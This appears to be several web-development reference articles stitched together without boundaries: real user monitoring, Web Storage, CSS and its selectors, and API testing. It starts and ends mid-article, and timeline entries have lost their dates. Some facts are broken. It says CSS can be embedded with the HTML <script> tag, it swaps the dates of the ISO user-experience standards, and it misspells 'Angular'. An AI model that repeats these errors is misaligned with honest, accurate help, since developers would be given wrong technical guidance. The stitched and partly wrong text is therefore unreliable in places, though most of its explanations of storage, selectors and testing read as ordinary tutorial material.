Critical product functionality should not get exposed to external threats .
Not useful for benchmarking - RUM data is inherently random because it depends entirely on user activity which is unpredictable .
So fixed interval monitoring of data may not yield accurate benchmarking results .
Google launched its Web Analytics solution that tracks and reports website traffic .
Dynatrace , Sematext and other software intelligence companies introduce their Application Performance Management products of which RUM is a part .
Over the next few years , these tools will employ Big Data and Cloud Based services to help internet companies monitor their user traffic .
The ISO Standard for measuring User experience was established ( ISO 9241 - 210 ) as early as 1999 .
With its introduction in 2008 , ISO 13407 has been revised for human - centred design for interactive systems .
The goal is to establish standards and metrics to measure user experience and engagement with web applications .
Gartner defines end - user experience in three dimensions - ( a ) End User Experience Monitoring ( RUM ) ; ( b ) Application discovery , tracing and diagnostics ( ADTD ) ; ( c ) Application analytics ( AA ) .
RUM data helps identify bottlenecks in a web application .
Source : Veeravalli 2017 .
In a blog post , a LinkedIn engineer describes how they used RUM to improve the performance of a Single Page Application ( SPA ) .
RUM data helped them identify bottlenecks .
Traditional RUM libraries rely on the Navigation Timing API and the Resource Timing API .
But these fail to capture JavaScript execution times .
To address this , they use the User Timing API .
To improve performance , they lazy load data and do lazy rendering .
Their web application is now faster by 20 % .
Client - server interactions on the web are stateless .
This means that a client request is independent of all previous requests .
However , many applications require the state to be maintained across requests .
Examples are shopping on e - commerce sites or filling in a form after login authentication .
HTTP cookies sent with every request allow us to maintain state .
Moreover , servers may store session data , often in a database .
Web Storage is a client - side feature that allows web apps to store data or state on the client / browser without involving the server .
Unlike HTTP cookies , storage is managed at the JavaScript layer .
Each web storage area is bound to an origin , which is a triplet of domain , protocol and port .
Thus , one domain ca n't access the storage of another .
Web Storage should n't be confused with cloud storage , which is about storing data on cloud computing platforms .
Why should I use Web Storage when I can use cookies instead ?
Cookies have been used to create a client - side state but it has its limitations .
Cookies can be created only on the server and then exchanged with the client .
The client must include the cookies with every request to the server .
The amount of cookie storage is limited to 4 KB .
Cookies are also not persistent .
They have an expiry time .
The W3C Recommendation for Web Storage notes an example in which a user could have the same site open on two windows .
With a cookie implementation , the cookie would " leak " from one window to the other , with the user ending up with duplicate flight bookings .
With web storage , data can be stored on the client without any support from the server .
This is useful for building Single Page Applications ( SPAs ) .
Unlike cookies , few megabytes can be stored .
Two different types of storage areas are available : local and session .
With the former , storage is persistent even if the browser is closed and reopened .
Some browsers allow 10 MB of web storage per origin while others allow 5 MB .
In Web Storage , how is browser local storage different from session storage ?
Comparing cookies , local storage and session storage .
Source : Carnes 2017 .
Local storage has no expiry .
Even if the browser is closed , the data will persist .
Session storage is limited to the current tab .
It will be lost when the tab is closed .
With session storage on an e - commerce site , it 's not possible to accidentally make double purchases just because the same site is open on two different tabs .
Using local storage for this use case is not a good idea since the storage is accessible to all tabs opened to that site .
Could you share real - world examples of sites using Web Storage ?
The CSS Lint website saves users ' selection of checkboxes in localStorage .
Source : CSS Lint 2020 .
By 2011 , many websites had started to use web storage .
A Twitter search tool called Snapbird used it to remember the last person 's Twitter stream that the user had searched from that browser .
The assumption is that users are likely to continue the same search at a later time , thus saving some effort in retyping the name .
Webbie Madness and CSS Lint are two other examples that use local storage to remember the user 's selection of checkboxes .
Web storage is not used to store sensitive content such as passwords , JSON Web Tokens or credit card information .
However , one developer used it to store the hashed ID of an authenticated user .
This hash is later used to give access to protected pages .
For example , it can be used to maintain a shopping cart for an e - commerce site .
In social websites , relying on the server for data can involve complex technologies such as server - side caching , distributed databases and DNS load balancers .
Instead , web storage can be used to locally store recent chat messages , system notifications and news feeds .
What are the basics of managing Web Storage ?
The API for using web storage is simple .
No libraries need to be installed .
Web storage can be used with plain JavaScript code .
The storage is just key - value pairs with values being only strings .
In case more complex data types need to be stored , such as JavaScript objects or arrays , they need to be serialized into strings .
To store ` username ` , for example , we can use the syntax ` localStorage.username = ' jsmith ' ` or ` localStorage.setItem('username ' , ' jsmith ' ) ` .
To retrieve data , use ` localStorage.getItem('username ' ) ` .
Use ` localStorage.length ` to know how many items are stored .
A key can be accessed by its integer position ` n ` by calling ` localStorage.key(n ) ` .
To delete a key - value pair , call ` localStorage.removeItem('username ' ) ` .
Call ` localStorage.clear ( ) ` to delete all pairs .
The syntax described above for ` localStorage ` is also applicable for ` sessionStorage ` .
When either local or session storage is modified , the ` storage ` event is fired .
The event will contain key , old value and new value .
An app will fail if it depends on web storage but is not supported in a particular browser .
The solution is to reliably ascertain browser support and have fallback code .
What are some common criticisms of Web Storage ?
Web Storage is limited to storing strings .
Although more complex data types can be serialized and stored as strings , this is seen as an " ugly hack " .
In terms of size , a few megabytes may not be enough for data - intensive apps or apps that need to work offline.$MERGE_SPACE$MERGE_SPACE
Moreover , it 's not easy to know when storage is at its limit .
Providing app functionality that 's highly dependent on web storage can be problematic .
Users might delete the data just as they tend to clear cookies .
The API is synchronous , which implies data loading can block rendering on the main thread .
This would be worse if files and images are stored .
Likewise , for background processing , web workers ca n't be used since they ca n't access web storage .
Web Storage has security issues .
Any JavaScript code on that page can access the storage .
Cross - site scripting attacks are possible .
A malicious JavaScript code can read the storage and send it to another domain of its choice .
This is unlikely if the entire code was built in - house .
However , it 's common for apps to use third - party code , which could have been compromised .
Could you share some resources for working with Web Storage ?
Chrome DevTools allows developers to view or edit web storage content .
Source : Basques 2019 .
Beginners can look at a demo of Web Storage as well as details of the storage events that are triggered by each change to the storage .
There are wrappers around Web Storage .
Lockr allows developers to store non - string values as well .
Store.js is similar to Lockr but with fallback should the browser lack support for web storage .
Crypt.io ( previously called secStore.js ) adds a security layer .
Barn provides a Redis - like interface .
For asynchronous calls , localForage combines the easy - to - use Web Storage API with IndexedDB .
A quick search on NPM will reveal many more packages related to local storage .
PersistJS is a cross - browser alternative to client - side storage .
If your app uses web storage , it 's easy to unit test your app even without access to the browser 's web storage .
Web Storage can be mocked and one developer shows how to do this in Angular .
Which are the alternatives to Web Storage ?
For sensitive data such as a session ID , it 's better to use signed cookies .
When using cookies , use the ` httpOnly ` cookie flag and set ` SameSite = strict ` and ` secure = true ` .
For most other sensitive data , use server - side storage .
For non - string and non - sensitive data , use IndexedDB .
This gives standard database features including primary keys , indexing , and transactions .
For offlineapplications,wecoulduse a combination of IndexedDB and Cache API that 's often used by service workers .
In fact , it 's possible to create a polyfill to override the default Web Storage API to store in IndexedDB and store asynchronously .
Web SQL used to be an alternative but W3C stopped working on this due to lack of implementations .
Application Cache is a text file to tell browsers what resources to cache .
This could be useful for offlineviewingofthe sites .
It 's more of a caching mechanism than client - side storage .
W3C releases the first working draft of Web Storage .
This draft defines both ` localStorage ` and ` sessionStorage ` .
In addition , it defines an interface to store in databases .
W3C publishes Web Storage as a W3C Recommendation .
Database storage defined in the first draft is deleted in the Recommendation .
Both ` localStorage ` and ` sessionStorage ` are referred to as IDL attributes , following Web IDL ( Interface Definition Language ) that 's used to describe interfaces web browsers are required to implement .
The Recommendation also points out issues of user privacy and sensitive data , and how user agents ( browsers ) can mitigate the risks .
W3C publishes Web Storage ( Second Edition ) as a W3C Recommendation .
Web storage is slow due to its synchronous nature .
On the other hand , IndexedDB is asynchronous but has a more complex API .
As a compromise , KV Storage is proposed .
It 's a key - value storage like web storage but with IndexedDB as the underlying storage .
It becomes available with the release of Chrome 74 on an experimental basis .
The trial ends with Chrome 76 .
In the future , IndexedDB may come with a simpler API .
CSS3 logo by W3C. Source : Wikipedia 2020 .
Web content is structured in HTML .
Apart from content , styling is also important .
A web designer often wishes to control font style , text size , alignment , page layout , image size , colours , backgrounds , margins , and so on .
Likewise , readers wish to customize styling without being at the mercy of bad web designers .
Cascading Style Sheets ( CSS ) is a web standard that gives both authors and readers control over styling .
A web server will serve web browsers both HTML and CSS .
The user may supply their own stylesheet .
Browsers will render the content according to the styles defined in one or more stylesheets .
In addition , when these stylesheets do n't define styles for some elements , the browser will apply its own defaults .
CSS is a stylesheet language .
It 's standardized by W3C. What are the benefits of using CSS ?
Elements inherit and can override the styles of parents .
Source : myposter 2017 , slide 20 .
Back in 2002 , Wired and ESPN were among the first sites to redesign their websites .
They saw better performance , faster design changes , and easier style sharing .
One of the best practices of web design is to keep content and structure separate from presentation and styling .
HTML provides the structure while CSS provides the styling .
Before CSS , authors used presentational HTML markup , now deprecated by W3C. For example , if a ` h2 ` tag had to be styled in a certain way , this extra markup would be included in every instance where the tag occurred .
This made it difficult to maintain the code .
The cascading aspect of CSS is important .
Both web authors and readers have control over styling .
The author may choose to show ` h3 ` tags in Italic but the reader may have a different preference .
The reader can therefore customize the style .
Elements for which no styles are defined , browser defaults apply .
Another important concept is inheritance .
An element inherits the style of its ancestor elements ( parents , grandparents , etc .
) .
The element itself can have an overriding style declaration .
Is CSS a programming language ?
Some do n't consider CSS a programming language .
Others view CSS as a declarative domain - specific programming language .
It 's declarative because CSS specifies a bunch of constraints .
It tells rendering engines what 's required but not how it should happen .
Unlike an imperative language such as JavaScript , CSS does n't give step - by - step instructions on how rendering should be done .
This implies that control flow is implicit in declarative languages .
Unlike general - purpose languages such as C or Python , CSS is domain - specific .
It 's been created for styling elements on a webpage .
On the final point about being a programming language , the very definition of the phrase " programming language " can be narrow or wide .
CSS has functions , variables , math , and more .
It would n't be entirely wrong to consider it a programming language .
How do I specify a style in CSS ?
Building blocks of the CSS ruleset .
Source : MDN Web Docs 2020b .
We can style an element by specifying a property and assigning a value to that property .
Property and value are separated by a colon .
Taken together , the syntax ` property : value ; ` is called a declaration .
Multiple declarations can be specified for the same element and these are separated by semi - colon .
For readability , each declaration can be on a separate line .
Multiple declarations are grouped together for the same element using a pair of braces ` { ... } ` .
We also need to select a DOM element to which the CSS declarations are to be applied .
This is done using the CSS Selector .
There are many ways to specify the selectors , including class name , identifier , tag name , attribute value , and more .
The position of the element within the DOM structure can also be used .
For example , ` li.active a ` selects anchor tags appearing within the list items of class ` active ` .
A CSS selector plus its set of declarations are jointly called a ruleset or simply a rule .
Which are the CSS properties and their permitted values ?
CSS properties and values are too numerous to mention here .
We share some of them to give you a sense of what 's possible in CSS : ` background ` : example values include ` green ` ( colour ) , and ` no - repeat url(" .. / .. /media / examples / lizard.png " ) ` ( image ) .
` border ` : use ` 2px dotted ` for width and style .
` color ` : specify the foreground ( text ) colour with values such as ` # 00ff00 ` , ` red ` , ` rgb(214 , 122 , 127 ) ` , and ` hsla(30 , 100 % , 50 % , .3 ) ` ( with alpha value as fourth argument ) .
` float ` : control the wrapping of an element around other elements with values such as ` none ` , ` left ` , ` inline - start ` and ` table - row ` .
` font - weight ` : control font boldness with values such as ` normal ` , ` bold ` , ` bolder ` , ` lighter ` , ` 100 ` , and ` 400 ` .
` margin ` : use ` 1em ` margin on all sides or ` 2px 1em 0 auto ` margin on top , right , bottom and left respectively .
` text - decoration ` : an example value is ` underline dotted red ` , which specifies line , style and colour .
All properties accept values ` inherit ` , ` initial ` or ` unset ` to revert to ancestor or global values .
Some properties , such as ` margin ` are shorthand forms .
For better readability , longer forms may be used , such as ` margin - top ` , ` margin - right ` , ` margin - bottom ` and ` margin - left ` .
How are CSS styles delivered to clients for rendering a webpage ?
Different ways to deliver CSS styles to clients .
Source : BitDegree 2016 .
One common way to do this is to save all CSS rules within a file of extension ` .css ` .
A stylesheet is linked from HTML pages using the ` & lt;link > ` tag .
Browsers will request the stylesheets when they see these links .
An alternative is to include CSS rules with HTML ` & lt;script> ... &lt;/script > ` tag .
The third method ( not preferred ) is to inline the styles with each element using the ` style ` attribute .
It 's possible to combine all these approaches for a single webpage .
Due to its cascading nature , CSS figures out the final style to apply to each element .
CSS styles have global scope , meaning that a selector can target any element of the DOM .
The early 2010s saw a trend towards Single Page Applications ( SPAs ) .
Frameworks such as Augular , React and Vue emerged .
About mid-2010s , CSS - in - JS emerged as a new way to scope styles to specific page components .
CSS rules were defined within the JavaScript code of each component .
Which are the key features of CSS ?
CSS has lots of features and we note a few of them : Animations : Visual effects can be created for better user engagement , for example , on mouse hover .
Using CSS 3D Transforms , a 360-degree view of a product can be displayed .
Calculations : Simple calculations to automatically size an element can be done with ` calc ( ) ` .
Custom Properties : Defined at root or component level , a browser will substitute all instances with its value .
For example , it 's useful for theming .
Gradients : Large images can be replaced with CSS Gradients that allow for smooth transitions across colours .
Image Filters : Background images , colours and gradients can be combined to create visual effects .
Images can be clipped or converted to grayscale .
Layouts : Beyond the use of tables , diverse layouts can be created with CSS Grid and CSS Flexbox .
Media Queries : These are useful for creating responsive designs .
A System - wide preference for dark mode can be fulfilled .
Besides HTML , where else is CSS useful ?
Use of CSS selectors in Selenium test automation .
Source : Balasubramanian 2018 .
Even in the early days of CSS , it was recognized that stylesheets could be applied to markup languages other than HTML .
CSS has been used with HTML , XML and XHTML .
While CSS is common in web browsers , many other software also uses CSS .
PDF generators parse HTML / XML+CSS to generate styled PDF documents .
E - books , such as the popular EPUB format , are styled using CSS .
Style languages have adopted CSS for their custom requirements : Qt Style Sheets and JavaFX Style Sheets for UI widgets , MapCSS for maps .
Of interest to developers , the popular jQuery library has the method ` css ( ) ` to set and get any CSS property value of an element .
For test automation , Selenium allows developers to select DOM elements using CSS selectors as an alternative to XPath selectors .
Could you share some developer resources for working with CSS ?
Property overflow rendered at CSS Reference .
Source : CSS Reference 2020 .
Visit W3C site for a description of all CSS specifications or search for CSS standards and drafts .
W3C also provides a free online CSS Validation Service to validate your stylesheets .
For a showcase of CSS capabilities , visit CSS Zen Garden .
CSS - Tricks is a popular blog focused on CSS for developers .
CSS Reference includes every CSS property and rendering of the same at different values .
A similar site is DevDocs .
The CSS page at Mozilla 's MDN Web Docs is a good place for beginners .
The site has tutorials and shares a cookbook of common layout patterns .
Nan Jeon has shared a handy cheatsheet on CSS selectors .
Each example includes HTML structure and infographics .
Make A Website Hub has published another useful CSS cheat sheet .
In the 1980s , stylesheets were created as part of the Standard Generalized Markup Language ( SGML ) .
These are named Document Style Semantics and Specification Language ( DSSL ) and Formatting Output Specification Instance ( FOSI ) .
Though considered for the Web a decade later , they have a limitation : they ca n't combine styles from different sources .
Tim Berners - Lee has a working web server and a browser on his NeXT computer at CERN .
There 's no CSS at this point , but Berners - Lee recognizes that it 's good to keep the document structure ( content ) separate from its layout ( styling ) .
His browser has the means to select style sheets .
He does n't publish the details , leaving it to browsers to control styling .
Indeed , when Pei - Yuan Wei created the ViolaWWW browser in 1991 , it came with its own stylesheet language .
Håkon Wium Lie releases a draft titled Cascading HTML Style Sheets .
This will be discussed , along with alternative proposals , at the Mosaic and the Web Conference in Chicago in November .
Lie 's proposal has the advantage of being designed for the Web .
Styles can be defined by the author , the reader , the browser or even based on device display capabilities .
Lie 's proposal could combine or " cascade " styles from different sources .
Microsoft 's Internet Explorer ( IE ) became the first commercial browser to support CSS .
IE has good support for font , colour , text and background properties but poor support for the box model .
When IE6 came out in 2001 , it had much better support for CSS and a browser market share of 80 % .
CSS Level 1 or CSS1 is released as a W3C Recommendation .
CSS1 allows styling of fonts , colours , background , text , and lists .
Box properties include width , height , margin , padding , and border .
A revised version of CSS1 was published in April 2008 .
In September 2018 , W3C officially superseded this by more recent Recommendations .
Collapsed border model illustrated in CSS2 W3C Recommendation .
Source : Bos et al .
1998 , second .
17 .
CSS Level 2 or CSS2 has been released as a W3C Recommendation .
It 's now possible to position elements and style page layout using tables .
To target media types and devices , the ` @media ` rule was introduced .
CSS2 expands the syntax for selectors .
The ' acid test ' page was created by Todd Fahrner .
Source : Bos 2016 .
Each browser renders CSS1 differently due to non - conformance with the specifications .
Todd Fahrner creates the " acid test " , a CSS1-styled document that a browser must render exact to the pixel .
This is based on the work done by Eric Meyer and others who developed a CSS test suite .
In later years , more acid tests are defined .
These are available at acidtests.org .
The first drafts for CSS Level 3 or CSS3 are published by W3C. In fact , work on CSS3 started just after the release of CSS2 .
Unlike CSS1 and CSS2 , CSS3 takes a modular approach .
There 's no single document .
One of the many designs at CSS Zen Garden .
Source : Web Design Museum 2020 .
Across browsers , support for CSS is inconsistent .
Web designers prefer to avoid CSS and use HTML tables instead .
Web designer Dave Shea sets out to change this by showcasing good CSS designs .
He launched the website CSS Zen Garden with simple HTML content that could be styled differently by changing only the CSS .
He showcases five of his own examples .
A little later , he allows the public to submit their own CSS designs .
CSS3 is a collection of separate documents .
It has become difficult to release these documents due to interdependencies .
It 's therefore proposed that CSS3 will be based only on CSS2.1 .
Each document will have its own level .
When CSS2.1 becomes a Recommendation , stable modules of CSS3 will also become Recommendations on their own .
This modularization doctrine is documented in the CSS Snapshot 2007 , which is meant for implementors to know the current state of standardization .
CSS Level 2 Revision 1 or CSS2.1 has been released as a W3C Recommendation .
CSS2.1 fixes some errors present in CSS2 , removes poorly supported features and adds features already supported by browsers .
It comes after more than a decade of edits , often changing status between Working Draft and Candidate Recommendation .
Subsequently , for CSS3 , CSS Color Level 3 , Selectors Level 3 , and CSS Namespaces are published as Recommendations .
CSS now has more than a hundred documents at different levels .
It may no longer make sense to use the terms " CSS3 " or " CSS4 " .
CSS continues to evolve with more capabilities .
A selection of CSS selectors mapped to DOM elements .
Source : CSS Solid 2020 .
Cascading Style Sheets ( CSS ) are commonly used to style web content .
To style a particular element on a HTML / XHTML page , we have to first select the element .
This is done using CSS Selectors .
A selector essentially selects or targets one or more elements for styling .
CSS3 specifications standardized by W3C define a wide variety of selectors .
A selector can target a single specific element or target multiple elements .
In a good web design , CSS selectors are written to balance clarity , portability , stylesheet size , ease of update , and performance .
Which are the commonly used CSS selectors ?
A web page is essentially a set of HTML / XHTML tags organized into a hierarchy .
It 's common to mark elements with identifiers and/or class names .
It 's therefore common to use the following as CSS selectors : By Tag Name : For instance , a paragraph can be selected with ` p ` , such as in ` p { color : # 444 ; } ` .
By Identifier : An HTML element can have the ` i d ` attribute that must be unique throughout the document .
Thus , identifier can be used to target a specific element .
For example , given the HTML snippet ` & lt;div id="footer">&lt;/div > ` , the relevant selector is ` # footer ` .
By Class Name : The ` class ` attribute is also common for HTML elements .
An element can have one or more classes .
Multiple elements can belong to a class .
By using a class - based CSS selector , we can target multiple elements .
For example , given the HTML snippet ` & lt;span class="pincode">&lt;/span > ` , the relevant selector is ` .pincode ` .
The above three selector syntaxes can be combined into a single selector .
Suppose we wish to target list items of class ` icon ` inside the footer , we can write ` # footer li.icon ` .
How can HTML attributes be used in CSS selectors ?
CSS selectors that use HTML element attributes .
Source : Adapted from MDN Web Docs 2020a .
HTML elements can have attributes and these can be used in CSS selectors .
The simplest syntax is to select by presence of the attribute .
For example , ` a[title ] ` targets all anchor elements with ` title ` attribute .
A more refined selection is to match the value of the attribute .
This comes in three variants ( also explained in the figure ) : ` [ attr = value ] ` : exact match : ` div[class="alert " ] ` will match ` & lt;div class="alert">&lt;/div > ` but not ` & lt;div class="alert - info">&lt;/div > ` .
` [ attr~=value ] ` : word match : ` div[class~="alert " ] ` will match ` & lt;div class="alert - info alert">&lt;/div > ` but not ` & lt;div class="alert - info">&lt;/div > ` .
` [ attr|=value ] ` : exact or with hyphen match : ` div[class|="alert " ] ` will match ` & lt;div class="alert">&lt;/div > ` , ` & lt;div class="alert - info">&lt;/div > ` and ` & lt;div class="alert - info alert">&lt;/div > ` but not ` & lt;div class="alertinfo">&lt;/div > ` or ` & lt;div class="alert alert - info">&lt;/div > ` .
It 's possible to match substrings of attribute values .
These take the forms ` [ attr^=value ] ` , ` [ attr$=value ] ` and ` [ attr*=value ] ` to match start , end and any part of the value string respectively .
HTML element names and attribute names are case insensitive but attribute values are case sensitive .
To match value strings in a case - insensitive manner , include the ` i ` flag .
For example , ` div[class="alert " ] ` will not match ` & lt;div class="Alert">&lt;/div > ` but ` div[class="alert " i ] ` will .
What 's the difference between pseudo - classes and pseudo - elements ?
Pseudo - classes and pseudo - elements give additional capability to CSS selectors .
Neither appears in the document source nor modifies the document tree .
Pseudo - classes are applied to elements due to their position ( eg .
last child ) or state ( eg .
read only ) .
Elements can gain or lose pseudo - classes as the user interacts with the document .
The syntax is ` : ` , such as in ` : enabled ` , ` : hover ` , ` : visited ` , ` : read - only ` , ` : last - child ` , or ` : nth - of - type ( ) ` .
Whereas pseudo - classes represent additional information about an element , pseudo - elements represent elements not explicitly present in the document tree .
A pseudo - element is always bound to another element ( called the originating element ) in the document .
It ca n't exist independently .
The syntax is ` : : ` , such as in ` : : before ` , ` : : after ` , ` : : placeholder ` , ` : : first - line ` , or ` : : first - letter ` .
In CSS1 and CSS2 , both pseudo - classes and pseudo - elements used single colon syntax for ` : : before ` , ` : : after ` , ` : : first - line ` , and ` : : first - letter ` .
Thus , browsers today accept either syntax for these special cases .
Where user actions are involved , the two can be combined .
For example , ` : : first - line : hover ` matches if the first line is hovered whereas ` : hover::first - line ` matches the first line of any originating element ( such as the second line of the paragraph ) that 's hovered .
Which are the CSS selectors for targeting descendants of an element ?
Examples for selecting descendants in CSS .
Source : Adapted from Jeon 2019 .
To select descendants , use multiple selectors separated by spaces .
For example , ` p a ` targets all links within paragraphs ; links outside paragraphs are not selected .
Selector ` .agenda ul a ` targets all links within unordered lists within elements of ` agenda ` class .
A more restrictive syntax selects only immediate children of an element , not grandchildren , great - grandchildren , etc .
For example , ` ul > a ` is incorrect since children of ` ul ` are ` li ` elements .
The correct selector would be ` ul > li > a ` .
Another example is a list containing other lists .
Selector ` ul > li ` selects only the first level list items whereas ` ul li ` selects list items at every nested level .
Pseudo - classes provide further control for child selection .
Some of these are ` : first - child ` , ` : last - child ` , ` : only - child ` , ` : nth - child ` , and ` : nth - last - child ` ( nth child from the end ) .
Children are one - indexed .
To target every third list item from the fourth item , use ` ul > li : nth - child(3n+4 ) ` .
To target exactly the fourth item , use ` ul > li : nth - child(4 ) ` .
To target the last but one item , use ` ul > li : nth - last - child(2 ) ` .
To target the last three items , use ` ul > li : nth - child(-n+3 ) ` Which are the CSS selectors for targeting siblings of an element ?
Examples for selecting siblings in CSS .
Source : Devopedia 2020 .
Assume a DOM structure in which elements ` h1 p p ul p ` are all children of the same parent and therefore siblings in that order .
CSS has two ways to select siblings by combining two selectors : Adjacent Sibling : For example , ` h1 + p ` means that we target ` p ` if it 's the immediate sibling following ` h1 ` .
Though ` ul ` is a sibling of ` h1 ` , it 's not the immediate sibling .
Hence , ` h1 + ul ` will not select ` ul ` .
General Sibling : For example , ` h1 ~ p ` will select all three ` p ` elements that are all siblings of ` h1 ` .
The selector ` p ~ h1 ` will not select ` h1 ` because the way CSS works , we 're targeting ` h1 ` siblings that follow a ` p ` element .
Combinator ` + ` targets only one sibling whereas ` ~ ` targets multiple siblings .
With ` ~ ` , it 's possible to obtain a specific sibling by using pseudo - classes such as ` : first - of - type ` , ` : last - of - type ` , ` : nth - of - type ( ) ` or ` : nth - last - of - type ( ) ` .
For example , ` h1 ~ p : nth - last - of - type(2 ) ` will select the second last ` p ` sibling of ` h1 ` .
What are quantity selectors in CSS ?
Illustrating quantity selectors in CSS .
Source : Adapted from Yank 2016 .
Given a number of children , it 's possible to select one or more of them depending on the number of children .
Quantity selectors help us do this .
Essentially , they are pseudo - classes .
Multiple pseudo - classes can be used together .
We share a few examples .
To select a list item if it 's the only item on the list , use ` li : only - child ` .
This logic can be reversed by doing ` li : not(:only - child ) ` .
To select the first child , if there are exactly six children , use ` li : nth - last - child(6):first - child ` .
This selects the sixth child from the end .
This can be the first child only if there are exactly six children .
To select children 2 - 6 , if there are exactly six children , use the general sibling combinator , as in ` li : nth - last - child(6):first - child ~ li ` .
If there are six or more children , and we wish to ignore the last 5 children , use ` li : nth - last - child(n+6 ) ` .
To select only the last 5 children , given that there are six or more children , use ` li : nth - last - child(n+6 ) ~ li ` .
Which are some uncommon CSS selectors ?
Some CSS selectors are either not widely known or commonly used , but could be useful in some cases : Universal : It 's inefficient to select all elements by using the universal selector ` * ` .
However , it could be used to select all children of an element , such as ` .footer > * ` .
Empty : Pseudo - class ` : empty ` targets elements with no content .
HTML comments are not considered .
Even if an element has only a single space , it 's considered non - empty .
Multiple Classes : ` p.last-section.section ` targets paragraphs that belong to both classes ` section ` and ` last - section ` .
Selector List : Same CSS styles can be applied to multiple selectors , which are separated by commas .
For example , ` em , i { ... } ` styles ` em ` and ` i ` tags alike .
Inverse Selection : Specify a selector and target the inverse set .
For example , ` : not(p ) ` selects all elements that are not paragraphs .
Another example is ` .nav > div : not(:first - child ) ` to select all ( except the first ) ` div ` children of ` .nav ` .
Could you share some best practices for using CSS selectors ?
To keep content separate from styling , avoid inline CSS styles .
Put styles on stylesheets .
An exception is when emailing HTML content , since many mail clients ignore stylesheets .
Write legible CSS rulesets .
Put each declaration on a separate line .
Be careful about spaces .
For example , selectors ` # header.callout ` ( header of callout class ) and ` # header .callout ` ( callout descendants of header ) target different elements .
Avoid repetitive rules .
If many selectors contain the same style declaration , abstract that into a separate class - based ruleset .
Move animations to the end of stylesheets so that browsers load and render basic styling first .
CSS allows the use of ` !
important ` in the value of a property .
This gives precedence to the declaration , overriding even inline styles .
CSS specificity determines selector precedence should multiple selectors target the same element .
Since ` !
important ` breaks this precedence order , it can make stylesheets hard to maintain and debug .
Long selectors resulting in high specificity , including use of identifiers , can break cascading and prevent efficient reuse of styles .
Keep selectors to two or three levels deep .
For example , replace ` # header # intro h1.big a.normal ` with ` .big .normal ` .
What are some performance considerations when designing CSS selectors ?
Selecting by identifier is fast .
Selecting by class , tag , child , descendant , or attribute exact match is fast in that order .
These results may vary across browsers .
In fact , the difference in speed between identifier and class selectors is negligible .
WebKit developer Dave Hyatt noted back in 2008 that it 's best to avoid using sibling , descendant and child selectors for better performance .
The way browsers parse CSS selectors is different from the way web designers write them .
Browsers read selectors in right - to - left order .
For example , given ` # social a ` , browsers will look at all ` a ` tags , move up the DOM tree and retain only those that are within ` # social ` .
This insight can help us write more performant selectors .
The rightmost selector is called the key selector .
The above example can be made more performant by adding a new class ` social - link ` to relevant anchor tags and then using the selector ` # social .social - link ` .
In fact , this selector is overqualified .
It can be simplified to just ` .social - link ` .
A poor selector is ` div : nth - of - type(3 ) ul : last - child li : nth - of - type(odd ) * ` .
It 's four levels deep and its key selector selects all elements of the DOM .
W3C publishes CSS3 module : W3C selectors .
In November 2018 , W3C published this as Selectors Level 3 W3C Recommendation .
To simplify DOM tree traversal and manipulation , John Resig released a new library named jQuery .
In JavaScript code , this allows us to select elements using CSS selectors , thus avoiding many lines of code that call ` getElementById ( ) ` or ` getElementsByClassName ( ) ` .
Jquery itself is partly inspired by cssQuery ( September 2005 ) .
An earlier effort to use CSS selectors in JavaScript is ` getElementsBySelector ( ) ` ( March 2003 ) .
In the W3C Working Draft , new API methods ` querySelector ( ) ` and ` querySelectorAll ( ) ` are introduced .
Browsers / clients must implement them for both ` DocumentSelector ` and ` ElementSelector ` interfaces .
Traditionally , DOM elements were selected using methods ` getElementById ( ) ` , ` getElementsByClassName ( ) ` , ` getElementsByTagName ( ) ` , ` getElementsByName ( ) ` , etc .
These are cumbersome .
The new API methods allow direct use of CSS selectors .
This becomes Selectors API Level 1 W3C Recommendation in February 2013 .
IE7 CSS performance drops to about 18 K child / descendant CSS rules .
Source : Souders 2009 .
In a study on CSS performance , it 's noted that optimizing selectors matters only if a webpage has many thousands of DOM elements .
For example , a Facebook page ( in 2009 ) has 2882 CSS rules and 1966 DOM elements , a scale easily handled by browsers .
Among a number of popular browsers , IE7 gives the best performance .
IE7 hits a performance limit only when a page has about 18 K child / descendant rules .
W3C publishes Selectors Level 4 as a Working Draft .
As of May 2020 , it 's still a Working Draft , with the latest version from November 2018 .
Among the new pseudo - classes are ` : is ( ) ` , ` : has ( ) ` , ` : where ( ) ` , ` : target - within ` , ` : focus - visible ` , and ` : focus - within ` .
Temporal pseudo - classes are ` : current ` , ` : past ` and ` : future ` .
There are new pseudo - classes for input states and value checking .
Grid pseudo - classes include ` : nth - col ( ) ` and ` : nth - last - col ( ) ` .
Illustrating the Lobotomized Owl selector .
Source : Yank 2016 .
Heydon Pickering proposes at a CSS conference a peculiar CSS selector of three characters that looks like an " owl 's vacant stare " .
He calls it the Lobotomized Owl .
This selector is ` * + * ` .
It selects all elements that follow other elements .
For example , this is useful when adding margin between two siblings without margin above the first element or below the last element .
The alternative , ` : not(:first - child):not(:root ) ` has high specificity and ca n't be easily overridden .
The Lobotomized Owl has zero specificity .
Applications today rely on APIs .
Whether it 's a web client requesting a service from a web application server , or one microservice requesting data or operation from another microservice , APIs play a key role .
Via APIs , developers give others access to their service .
At the same time , organizations are embracing Agile methodology and making frequent product releases .
It 's therefore important to test these APIs .
API testing is useful to validate a solution and to find errors .
API testing complements unit testing and end - to - end testing .
It enables more efficient use of test resources .
Problems can be caught earlier in the development cycle .
The HTTP RESTful API is the most widely used architecture .
However , this article describes API testing in general and is therefore relevant to other API types such as SOAP or GWT RPC .
Do I need API testing for my application ?
API testing happens at the API layer .
Source : TestBytes 2020 .
A web application typically consists of three layers : user interface , business logic and database .
End - to - end testing would test all layers of the app , but it 's also slower .
Problems are hard to isolate .
Business logic may need many tests , for which we will end up unnecessarily exercising the UI in the same way .
Moreover , end - to - end testing can begin only when all layers are available .
API testing solves this problem by bypassing the UI .
It executes tests at the service or business layer .
While unit tests are typically written by developers and take a white - box testing approach , API tests are usually written by the QA team and view the system under test ( SUT ) as a black box .
However , not everyone agrees on this division of roles .
Some feel that developers should do API testing since they created the APIs .
Others say that since APIs specify a contract , they need to be validated by testers .
While unit tests exercise the business logic directly , API tests go through the API layer .
What 's the flow of a typical API test ?
Steps in a typical API test .
Source : SmartBear 2020 .
An API test first calls an API endpoint , which is really a URL .
HTTP headers are set as required for the test .
The type of HTTP request may be GET , POST , PUT , DELETE , etc .
With each of these , the necessary data is sent to the API endpoint .
Once a response is received , the response code and contents are validated .
HTTP headers that specify access control , content type , or server might be validated .
In a sequence of API calls , some parts of a response may be used for the next API call .
For example , a POST request might return an identifier .
A subsequent GET request might verify that the response includes this identifier .
API testing is generally black - box testing .
We do n't look at what happens behind the API server .
We only validate the responses .
